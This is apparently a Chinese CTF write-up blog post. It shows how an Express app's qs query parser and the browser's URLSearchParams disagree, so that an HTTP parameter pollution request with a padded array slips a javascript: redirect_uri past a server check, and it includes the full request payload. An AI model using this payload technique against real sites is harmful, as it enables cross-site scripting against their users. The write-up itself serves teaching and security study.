---
title: 通过HPP来造成XSS
url: https://mp.weixin.qq.com/s/D1jcJthm3SAzYWFKfeWE0Q
source: Doonsec's feed
date: 2026-04-25
fetch_date: 2026-04-26T04:58:24.096187
---

# 通过HPP来造成XSS

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ULOszTo2RiaBQic4Ds0uys5QU513zSQa063qh5bmujz8JQOicjBnQnQUjM61svrfS1jibN6du6E0TZXibQp2dhB80VEaTuxVicvLiaNUM0j4u9a1Mc/0?wx_fmt=jpeg)

# 通过HPP来造成XSS

IceCliffs
IceCliffs

Gh0xE9

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

通过HPP来造成XSS，水文

挑战源代码如下，需要的自取

```
const express = require('express');
const app = express();

app.set('query parser', 'extended');

app.get('/', (req, res) => {
  const redirectUri = req.query.redirect_uri;

  if (!redirectUri) {
    return res.send("redirect_uri is required");
  }

  if (redirectUri !== "https://pwnbox.xyz/docs") {
    return res.send("Invalid redirect_uri");
  }

  return res.send(`
    <script>
      location = new URLSearchParams(window.location.search).get("redirect_uri");
    </script>
  `);
});

app.listen(3000, () => console.log('Listening on port 3000'));
```

从代码层面上看很容易知道我们需要的漏洞点，无非就两个，一个任意链接跳转，一个就是任意连接+伪协议引发的XSS漏洞，但是代码中明显限制了一个条件，如果跳转地址不等于 `https://pwnbox.xyz/docs` 那就会失效，并且我们注意到浏览器是用 `new URLSearchParams(window.location.search).get("redirect_uri");` 来进行渲染的，我们查一下这个函数的API，会发现`get()`方法会返回与参数关联的第一个值，也就是说如果同一个键出现多次，他都只会返回第一个值

> https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams/get

![image-20260415192614429](https://mmbiz.qpic.cn/mmbiz_png/ULOszTo2RiaCt920qJymTFQwl97lf8icycf6JyaNibDUapnDxOJv2vlJauVgC5TGnJFkBGUNuwca1HKMVrPfP0kH0q6ia5aLmBJUVxAiaR7herqM/640?wx_fmt=png&from=appmsg "null")

image-20260415192614429

![image-20260415192638067](https://mmbiz.qpic.cn/sz_mmbiz_png/ULOszTo2RiaDRaibFdva0Uv5PibVQqNzHTjIczAlxIePFg1vS6wxel1VzvcdicCtib5LJjQdjkKaNqPdmJTQw63lab8CuoLk5bEz1sPYwIODta9Y/640?wx_fmt=png&from=appmsg "null")

image-20260415192638067

这时候肯定就要想办法绕过了，qs 存在一个特性，例如我们发送 `foo[x]=bar` 则会被解析成一个对象，也就是 `q.query.foo = { x: 'bar' };`，

```
{
  foo: {
    x: 'bar'
  }
}
```

如果熟悉原型污染的话，应该对上面很熟悉，我们阅读 qs 的文档发现官方留了这么一句话，有这么一个参数 `arrayLimit`，默认值为 1000

```
For similar reasons, by default qs will only parse up to 1000 parameters. This can be overridden by passing a parameterLimit option:
```

所以可以利用这个特性来做一个绕过

> https://www.npmjs.com/package/qs

当我们发送一个超长数组超过索引限制后，qs 就会将其解析成对象，然后浏览器端的 `URLSearchParams` 他不会识别 `[]` 语法，所以也就不存在 `arrayList`，对于浏览器来说 URL 结尾处的 `&redirect_uri=javascript:alert('1')` 是一个名为 `redirect_uri` 的 key，当执行 `new URLSearchParams(window.location.search).get("redirect_uri")` 时，浏览器会忽略前面的乱七八糟的参数，直接精准命中了末尾的 `javascript:alert('1')`，所以最后的 payload

```
GET /?%5Bredirect_uri%5D=https://pwnbox.xyz/docs&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&a=1&redirect_uri=javascript:alert('1') HTTP/1.1
Host: nmsl.cnm:3000
```

最后

![image-20260415193450182](https://mmbiz.qpic.cn/mmbiz_png/ULOszTo2RiaCuHA4uFDL7zZ6XywFR8rNyDxpoufqK2gou2PsEgVLGeVE3ticyQoX9vQeIHlM2OHp0xNHgKGJkibZxV5Uso9TPd2bzsrY0gc4Dc/640?wx_fmt=png&from=appmsg "null")

image-20260415193450182

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/PCyTOKZ2NRVr5amhm5hic1yQqSxe9uickIZLqEV7ZBxeJtZZiaxjTz01hg7QNkiaCyukU9tMo3GwhMcjXCCAdLXsGA/0?wx_fmt=png)

Gh0xE9

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/PCyTOKZ2NRVr5amhm5hic1yQqSxe9uickIZLqEV7ZBxeJtZZiaxjTz01hg7QNkiaCyukU9tMo3GwhMcjXCCAdLXsGA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过